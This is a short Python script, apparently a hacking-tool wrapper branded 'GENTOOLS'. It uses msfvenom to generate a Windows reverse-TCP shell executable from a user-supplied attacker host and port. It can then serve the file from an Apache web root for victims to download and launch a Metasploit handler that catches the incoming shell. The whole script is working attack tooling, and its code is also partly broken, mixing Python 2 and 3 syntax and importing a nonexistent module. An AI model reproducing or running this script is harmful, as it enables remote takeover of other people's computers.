import sqlite3
import os
import time
import Network.Whois

print('''
	      ********  ******** ****     **   **********   *******     *******   **        ********
  **//////**/**///// /**/**   /**  /////**///   **/////**   **/////** /**       **////// 
 **      // /**      /**//**  /**      /**     **     //** **     //**/**      /**       
/**         /******* /** //** /**      /**    /**      /**/**      /**/**      /*********
/**    *****/**////  /**  //**/**      /**    /**      /**/**      /**/**      ////////**
//**  ////**/**      /**   //****      /**    //**     ** //**     ** /**             /**
 //******** /********/**    //***      /**     //*******   //*******  /******** ******** 
  ////////  //////// //      ///       //       ///////     ///////   //////// ////////   
  ''')

lhost = input("Enter LHOST: ")
lport = raw_input("Enter LPORT: ")
name  = raw_input("Enter Payload Name: ")
os.system("msfvenom -p windows/shell/reverse_tcp LHOST=%s LPORT=%s -f exe > %s.exe"%(lhost,lport,name))

print "Payload Successfuly Generated"
print "/1/-Do You Want To Start a listenner"
print "/2/-Do You Want To Start an IP Poisener "
li = raw_input()
if li == '2' :
	os.system('sudo service apache2 start')
	os.system('sudo cp %s.exe /var/www/html'%(name))
	print "Your IP Successfully Poisened : %s/%s.exe"%(lhost,name)
	listen = """
	use exploit/multi/handler
	set PAYLOAD windows/shell/reverse_tcp
	set LHOST {0}
	set LPORT {1}
	exploit
	""".format(lhost,lport)
	with open('command.txt', 'w') as f :
		f.write(listen)
	os.system('msfconsole -r command.txt')

else :
	listen = """
	use exploit/multi/handler
	set PAYLOAD windows/shell/reverse_tcp
	set LHOST {0}
	set LPORT {1}
	exploit
	""".format(lhost,lport)
	with open('command.txt', 'w') as f :
		f.write(listen)
	os.system('msfconsole -r command.txt')